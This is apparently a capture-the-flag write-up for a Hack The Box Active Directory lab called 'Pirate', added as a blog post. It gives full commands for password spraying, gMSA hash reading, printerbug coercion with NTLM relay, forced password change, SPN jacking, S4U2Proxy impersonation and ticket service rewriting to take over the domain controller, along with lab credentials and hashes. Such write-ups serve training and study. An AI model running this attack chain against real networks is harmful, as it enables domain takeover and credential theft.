@@ -1,0 +1,342 @@
+---
+title: Pirate
+published: 2026-03-05
+toc: true
+draft: false
+tags:
+  - ActiveDirectory
+  - BloodHound
+  - SPN-Jacking
+  - S4U2Proxy
+  - forcechangepassword
+---
+
+import PasswordProtect from '~/components/PasswordProtect.client';
+
+```
+Scope:
+10.129.244.95
+
+Creds:
+pentest
+p3nt3st2025!&
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -Pn -T5 --min-rate=5000 -vvvv pirate.htb
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-03-05 13:41:38Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
+| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
+|_ssl-date: 2026-03-05T13:43:07+00:00; +6h59m57s from scanner time.
+443/tcp   open  https?        syn-ack
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
+| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
+|_ssl-date: 2026-03-05T13:43:07+00:00; +6h59m57s from scanner time.
+2179/tcp  open  vmrdp?        syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-05T13:43:07+00:00; +6h59m57s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
+| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-05T13:43:07+00:00; +6h59m57s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
+| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49685/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49686/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49914/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49940/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49964/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 65389/tcp): CLEAN (Timeout)
+|   Check 2 (port 57669/tcp): CLEAN (Timeout)
+|   Check 3 (port 53723/udp): CLEAN (Timeout)
+|   Check 4 (port 21019/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s
+| smb2-time: 
+|   date: 2026-03-05T13:42:27
+|_  start_date: N/A
+```
+
+In order to avoid clock skew errors I used the following commands to adjust the time to that of the target:
+
+```bash
+sudo timedatectl set-ntp true
+sudo ntpdate -u 10.129.244.95
+sudo timedatectl set-ntp false 
+```
+
+![](attachments/c721d689e71058883d2215aff7dde94f.png)
+
+<PasswordProtect client:load>
+
+## NXC
+
+I generated a `krb5.conf` file:
+
+![](attachments/8e4cda1dbd8819f28de83c9aba794a2b.png)
+
+Then started my enumeration:
+
+![](attachments/90dfe3f700d288e00d481ef5e49ad7e1.png)
+
+![](attachments/0f7ccd0113ef232900ef7b20bbf31cb1.png)
+
+I also noticed some `gMSA` accounts:
+
+![](attachments/d141b46887fb4c1bb8033d63cf2a2d2b.png)
+
+My current user does not have READ permissions on them, so might need to take someone else over that does:
+
+![](attachments/7b4e6237fd9c102eff9381f656bf4e3f.png)
+
+I tried spraying the machine accounts with the `name - name` combo and found a working one!
+
+![](attachments/a0e98644824ca31841c7f962fe5c3097.png)
+
+```
+MS01$
+ms01
+```
+
+## BloodHound
+
+Since I couldn't find anything else I booted up `bloodhound`
+
+![](attachments/3ad7b73f6d60376175ad1256b8e6e5d7.png)
+
+![](attachments/a3aa11512f4ce134395e532e4b4a77fa.png)
+
+>[!danger]
+>Be sure to use `bloodhound-python` instead of the CE version for querying here as that one will NOT work:
+>
+![](attachments/d75b7f4d04c0ed77d3396471c2a3f444.png)
+
+### ReadGMSAPassword
+
+Once all the necessary info has been gathered we can import it and start graphing the data.
+
+![](attachments/c825b54e0c5bb0f2e5d4ebcccdc59b3e.png)
+
+I noticed that the *MS01$* machine account was able to read the `gMSA` passwords so let's do that right away and get access via `winrm` with *gmsa_adfs_prod*:
+
+![](attachments/e0afad6f463b44503ca995b101dcab35.png)
+
+```
+gMSA_ADCS_prod$
+304106f739822ea2ad8ebe23f802d078
+
+gMSA_ADFS_prod$
+8126756fb2e69697bfcb04816e685839
+```
+
+# Foothold
+## evil-winrm as gMSA_ADFS_prod$
+
+![](attachments/4424b4b818c016919da048f7dc6672b8.png)
+
+Nothing interesting stood out at first:
+
+![](attachments/a0023e4bc91957055afc110bc3c82ba6.png)
+
+I did however find another IP address:
+
+![](attachments/9443f22f4650248898dc5ad0800485ed.png)
+
+Which turned out to be **WEB01**:
+
+![](attachments/4c30afc98b5f00647f1777ca084d1206.png)
+
+## Pivoting
+
+Time to pivot to **WEB01** and for this I'll be uploading the `agent.exe` binary from `ligolo-ng`:
+
+![](attachments/01e1c1d4c2328a98321eeac06c6dff55.png)
+
+![](attachments/8bc22281736fbe78c51e366dffa42890.png)
+
+![](attachments/084462e9bc7a9cd8a25453e8b48502aa.png)
+
+![](attachments/c3c08a595e3503c559504c80b0d024ca.png)
+
+![](attachments/b2afee2d8935991a84959edfd84cecc4.png)
+
+I `ping` the **WEB01** host to verify that everything works:
+
+![](attachments/347b275f7b244c0a1e653be63d9ffef3.png)
+
+### WEB01 enumeration
+
+I started enumerating the host:
+
+![](attachments/f7cfff6f35cd20e9b1d3989d18e03dff.png)
+
+
+
+![](attachments/097ad88ac3bf2ba7b5d961b2961fd186.png)
+
+### NTLM Relay
+
+We can now use the following commands in order to exploit the `printerbug` coercion vulnerability:
+
+```bash
+printerbug pirate.htb/'gMSA_ADFS_prod$'@192.168.100.2 10.10.14.53 -hashes :8126756fb2e69697bfcb04816e685839
+impacket-ntlmrelayx -smb2support --no-http-server -t ldap://dc01.pirate.htb --remove-mic --delegate-access
+```
+
+![](attachments/5e6d0c303ade8265950a090204b4c9aa.png)
+
+![](attachments/ec44b28b19a6032aeccb2739ff640744.png)
+
+```
+DMHFOLDE$
+W.!wJVYi-;dTG9P
+```
+
+### S4U2Proxy
+
+![](attachments/11af3fd2f5e003f546fc6688ed6e788c.png)
+
+Now we can export this ticket and use it to dump some passwords:
+
+![](attachments/a572284d9edeb441244bf902e90eacb7.png)
+
+I found a cleartext password for the *a.white* user which appeared to be valid!:
+
+```
+a.white
+E2nvAOKSz5Xz2MJu
+```
+
+![](attachments/77cf0486a0e84c03b3b36fd294d40092.png)
+
+Now we're getting somewhere:
+
+![](attachments/e3ab995c826d376f88183612f59c3be1.png)
+
+We can use this account to `ForceChangePassword` the *a.white_adm* account, which is a member of the **IT** group.
+
+# Privilege Escalation
+## ForceChangePassword
+
+I'll start off by changing the password, which can easily be done:
+
+```bash
+bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p E2nvAOKSz5Xz2MJu --dc-ip 10.129.244.95 set password a.white_adm 'Password123!'
+```
+
+![](attachments/eb6b256d4510ffdb3f8e7a79653e9f90.png)
+
+## SPN Jacking 
+
+We can find and remove the SPN for **WEB01** in order to replace it with a malicious one afterwards.
+
+```bash
+impacket-findDelegation pirate.htb/a.white_adm:'Password123!'
+```
+
+![](attachments/8b70a59ddba6db5a6d7d1c6bfcb4e32b.png)
+
+Now remove it:
+
+```bash
+addspn -t 'WEB01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' 'dc01.pirate.htb' -r --spn 'http/WEB01.pirate.htb'
+```
+
+![](attachments/29d580474c40d5e54c9ee832bf62ccb6.png)
+
+Now we can add the SPN again:
+
+```bash
+addspn -t 'DC01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' 'dc01.pirate.htb' --spn 'http/WEB01.pirate.htb'
+```
+
+![](attachments/3a4ae54dc36c461b3766cda3bd1b6516.png)
+
+We can then verify this again:
+
+![](attachments/676acf0722166431950e09c72f80f04a.png)
+
+## S4U2Proxy 
+
+And accordingly impersonate the *Administrator* of **DC01** by abusing `S4U2Proxy`:
+
+```bash
+impacket-getST -spn 'http/WEB01.pirate.htb' -impersonate administrator 'pirate.htb/a.white_adm:Password123!' -dc dc01.pirate.htb
+```
+
+![](attachments/9c8e7599ed05218d6e6981beaf6c44c3.png)
+
+![](attachments/7102cb6b40faefe41bddae5ea145ed68.png)
+
+However we cannot use this yet:
+
+![](attachments/bb1cc6d4b848f294bbef5f666cbb16a1.png)
+
+## tgssub
+
+I exploited constrained delegation by impersonating the domain Administrator to obtain a Kerberos service ticket for **HTTP on WEB01**, then modified the ticket’s service field to **CIFS on the domain controller**, allowing me to authenticate to DC01 and execute commands as **NT AUTHORITY\SYSTEM**. This can be done with `tgssub`:
+
+```bash
+tgssub -in administrator@http_WEB01.pirate.htb@PIRATE.HTB.ccache -out Administrator.ccache -altservice "cifs/DC01.pirate.htb"
+```
+
+![](attachments/1758cf4dd4465ae9922e0b7fcc361d18.png)
+
+### root.txt
+
+![](attachments/bbda41d51b00edf3812dfc205a415ac1.png)
+
+### user.txt
+
+Afterwards I went looking for the `user.txt` flag since I couldn't find it on this machine. To make my life easier I dumped `ntds` using `nxc` so I can dump the *Administrator* hash of the domain:
+
+![](attachments/29be976e8117b27cb300d38f83e03d5b.png)
+
+The `user.txt` was then discovered within the *a.white* user's `Desktop` directory 
+
+![](attachments/48915dd23d88b8fc908d016a12c7997e.png)
+
+![](attachments/83776dfde0c057982753862c893111a9.png)
+
+![](attachments/e890f3b69683014cf4bd8861079926b5.png)
+
+</PasswordProtect>
+
+---
